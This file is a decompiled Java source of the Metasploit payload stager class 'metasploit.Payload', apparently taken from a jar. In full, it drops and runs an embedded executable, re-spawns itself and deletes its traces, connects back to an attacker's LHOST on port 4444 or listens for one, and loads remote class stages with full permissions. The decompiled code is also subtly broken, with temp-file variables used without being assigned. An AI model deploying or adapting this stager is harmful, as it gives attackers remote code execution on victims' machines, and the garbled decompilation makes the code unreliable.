package metasploit;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Enumeration;
import java.util.Locale;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;

/* loaded from: 1699595576.jar:metasploit/Payload.class */
public class Payload extends ClassLoader {
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    private static final String PATH_SEP = System.getProperty("path.separator");
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    private static final boolean IS_DOS = PATH_SEP.equals(";");
    private static final String JAVA_HOME = System.getProperty("java.home");

    public static void main(String[] strArr) throws Exception {
        Socket accept;
        PrintStream outputStream;
        File createTempFile;
        File createTempFile2;
        Properties properties = new Properties();
        String str = Payload.class.getName().replace('.', '/') + ".class";
        InputStream resourceAsStream = Payload.class.getResourceAsStream("/metasploit.dat");
        if (resourceAsStream != null) {
            properties.load(resourceAsStream);
            resourceAsStream.close();
        }
        String property = properties.getProperty("Executable");
        if (property != null) {
            File.createTempFile("~spawn", ".tmp").delete();
            File file = new File(createTempFile2.getAbsolutePath() + ".dir");
            file.mkdir();
            File file2 = new File(file, property);
            writeEmbeddedFile(Payload.class, property, file2);
            properties.remove("Executable");
            properties.put("DroppedExecutable", file2.getCanonicalPath());
        }
        int parseInt = Integer.parseInt(properties.getProperty("Spawn", "0"));
        String property2 = properties.getProperty("DroppedExecutable");
        if (parseInt > 0) {
            properties.setProperty("Spawn", String.valueOf(parseInt - 1));
            File.createTempFile("~spawn", ".tmp").delete();
            File file3 = new File(createTempFile.getAbsolutePath() + ".dir");
            File file4 = new File(file3, "metasploit.dat");
            File file5 = new File(file3, str);
            file5.getParentFile().mkdirs();
            writeEmbeddedFile(Payload.class, str, file5);
            if (properties.getProperty("URL", "").startsWith("https:")) {
                writeEmbeddedFile(Payload.class, "metasploit/PayloadTrustManager.class", new File(file5.getParentFile(), "PayloadTrustManager.class"));
            }
            if (properties.getProperty("AESPassword", null) != null) {
                writeEmbeddedFile(Payload.class, "metasploit/AESEncryption.class", new File(file5.getParentFile(), "AESEncryption.class"));
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file4);
            properties.store(fileOutputStream, "");
            fileOutputStream.close();
            Process exec = Runtime.getRuntime().exec(new String[]{getJreExecutable("java"), "-classpath", file3.getAbsolutePath(), Payload.class.getName()});
            exec.getInputStream().close();
            exec.getErrorStream().close();
            Thread.sleep(2000L);
            File[] fileArr = {file5, file5.getParentFile(), file4, file3};
            for (int i = 0; i < fileArr.length; i++) {
                for (int i2 = 0; i2 < 10 && !fileArr[i].delete(); i2++) {
                    fileArr[i].deleteOnExit();
                    Thread.sleep(100L);
                }
            }
        } else if (property2 != null) {
            File file6 = new File(property2);
            try {
                if (!IS_DOS) {
                    try {
                        File.class.getMethod("setExecutable", Boolean.TYPE).invoke(file6, Boolean.TRUE);
                    } catch (NoSuchMethodException e) {
                        Runtime.getRuntime().exec(new String[]{"chmod", "+x", property2}).waitFor();
                    }
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            Runtime.getRuntime().exec(new String[]{property2});
            if (IS_DOS) {
                return;
            }
            file6.delete();
            file6.getParentFile().delete();
        } else {
            int parseInt2 = Integer.parseInt(properties.getProperty("LPORT", "4444"));
            String property3 = properties.getProperty("LHOST", null);
            String property4 = properties.getProperty("URL", null);
            ByteArrayInputStream byteArrayInputStream = null;
            if (parseInt2 <= 0) {
                byteArrayInputStream = System.in;
                outputStream = System.out;
            } else if (property4 != null) {
                if (property4.startsWith("raw:")) {
                    byteArrayInputStream = new ByteArrayInputStream(property4.substring(4).getBytes("ISO-8859-1"));
                } else if (property4.startsWith("http")) {
                    URLConnection openConnection = new URL(property4).openConnection();
                    if (property4.startsWith("https:")) {
                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", URLConnection.class).invoke(null, openConnection);
                    }
                    addRequestHeaders(openConnection, properties);
                    byteArrayInputStream = openConnection.getInputStream();
                }
                outputStream = new ByteArrayOutputStream();
            } else {
                if (property3 != null) {
                    accept = new Socket(property3, parseInt2);
                } else {
                    ServerSocket serverSocket = new ServerSocket(parseInt2);
                    accept = serverSocket.accept();
                    serverSocket.close();
                }
                byteArrayInputStream = accept.getInputStream();
                outputStream = accept.getOutputStream();
            }
            String property5 = properties.getProperty("AESPassword", null);
            if (property5 != null) {
                Object[] objArr = (Object[]) Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke(null, byteArrayInputStream, outputStream, property5);
                byteArrayInputStream = (InputStream) objArr[0];
                outputStream = (OutputStream) objArr[1];
            }
            StringTokenizer stringTokenizer = new StringTokenizer("Payload -- " + properties.getProperty("StageParameters", ""), " ");
            String[] strArr2 = new String[stringTokenizer.countTokens()];
            for (int i3 = 0; i3 < strArr2.length; i3++) {
                strArr2[i3] = stringTokenizer.nextToken();
            }
            new Payload().bootstrap(byteArrayInputStream, outputStream, properties.getProperty("EmbeddedStage", null), strArr2);
        }
    }

    private static void addRequestHeaders(URLConnection uRLConnection, Properties properties) {
        Enumeration<?> propertyNames = properties.propertyNames();
        while (propertyNames.hasMoreElements()) {
            Object nextElement = propertyNames.nextElement();
            if (nextElement instanceof String) {
                String str = (String) nextElement;
                if (str.startsWith("Header")) {
                    uRLConnection.addRequestProperty(str.substring(6), properties.getProperty(str));
                }
            }
        }
    }

    private static void writeEmbeddedFile(Class cls, String str, File file) throws FileNotFoundException, IOException {
        InputStream resourceAsStream = cls.getResourceAsStream("/" + str);
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        byte[] bArr = new byte[4096];
        while (true) {
            int read = resourceAsStream.read(bArr);
            if (read == -1) {
                fileOutputStream.close();
                return;
            }
            fileOutputStream.write(bArr, 0, read);
        }
    }

    private final void bootstrap(InputStream inputStream, OutputStream outputStream, String str, String[] strArr) throws Exception {
        Class<?> cls;
        try {
            DataInputStream dataInputStream = new DataInputStream(inputStream);
            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            if (str == null) {
                int readInt = dataInputStream.readInt();
                do {
                    byte[] bArr = new byte[readInt];
                    dataInputStream.readFully(bArr);
                    Class<?> defineClass = defineClass(null, bArr, 0, readInt, protectionDomain);
                    cls = defineClass;
                    resolveClass(defineClass);
                    readInt = dataInputStream.readInt();
                } while (readInt > 0);
            } else {
                cls = Class.forName("javapayload.stage." + str);
            }
            cls.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(cls.newInstance(), dataInputStream, outputStream, strArr);
        } catch (Throwable th) {
            th.printStackTrace(new PrintStream(outputStream));
        }
    }

    private static String getJreExecutable(String str) {
        File file = null;
        if (IS_AIX) {
            file = findInDir(JAVA_HOME + "/sh", str);
        }
        if (file == null) {
            file = findInDir(JAVA_HOME + "/bin", str);
        }
        return file != null ? file.getAbsolutePath() : addExtension(str);
    }

    private static String addExtension(String str) {
        return str + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String str, String str2) {
        File normalize = normalize(str);
        File file = null;
        if (normalize.exists()) {
            file = new File(normalize, addExtension(str2));
            if (!file.exists()) {
                file = null;
            }
        }
        return file;
    }

    private static File normalize(String str) {
        Stack stack = new Stack();
        String[] dissect = dissect(str);
        stack.push(dissect[0]);
        StringTokenizer stringTokenizer = new StringTokenizer(dissect[1], File.separator);
        while (stringTokenizer.hasMoreTokens()) {
            String nextToken = stringTokenizer.nextToken();
            if (!".".equals(nextToken)) {
                if (!"..".equals(nextToken)) {
                    stack.push(nextToken);
                } else if (stack.size() < 2) {
                    return new File(str);
                } else {
                    stack.pop();
                }
            }
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < stack.size(); i++) {
            if (i > 1) {
                sb.append(File.separatorChar);
            }
            sb.append(stack.elementAt(i));
        }
        return new File(sb.toString());
    }

    private static String[] dissect(String str) {
        String str2;
        String substring;
        char c = File.separatorChar;
        String replace = str.replace('/', c).replace('\\', c);
        int indexOf = replace.indexOf(58);
        if (indexOf > 0 && IS_DOS) {
            int i = indexOf + 1;
            String substring2 = replace.substring(0, i);
            char[] charArray = replace.toCharArray();
            str2 = substring2 + c;
            int i2 = charArray[i] == c ? i + 1 : i;
            StringBuilder sb = new StringBuilder();
            for (int i3 = i2; i3 < charArray.length; i3++) {
                if (charArray[i3] != c || charArray[i3 - 1] != c) {
                    sb.append(charArray[i3]);
                }
            }
            substring = sb.toString();
        } else if (replace.length() <= 1 || replace.charAt(1) != c) {
            str2 = File.separator;
            substring = replace.substring(1);
        } else {
            int indexOf2 = replace.indexOf(c, replace.indexOf(c, 2) + 1);
            str2 = indexOf2 > 2 ? replace.substring(0, indexOf2 + 1) : replace;
            substring = replace.substring(str2.length());
        }
        return new String[]{str2, substring};
    }
}